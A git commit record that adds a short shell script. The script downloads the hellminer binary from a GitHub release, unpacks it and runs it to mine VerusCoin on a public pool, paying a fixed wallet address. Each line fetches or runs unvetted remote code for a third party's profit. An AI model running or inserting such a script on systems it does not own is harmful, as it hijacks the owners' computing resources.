3eae60a241391d0a6398a67b48d6bb3efd253d5c
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-30 14:43:38 -0300

    Create verus2.sh

---
+++ verus2.sh
@@ -0,0 +1,5 @@
+# veruscoin
+sudo apt update
+wget https://github.com/hellcatz/hminer/releases/download/v0.56/hellminer_linux64.tar.gz
+tar xf hellminer_linux64.tar.gz
+./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RV15qZeZ9qggbWznCwQ8mcvfyRrhB9zEEN.rig1 -p x --cpu 4
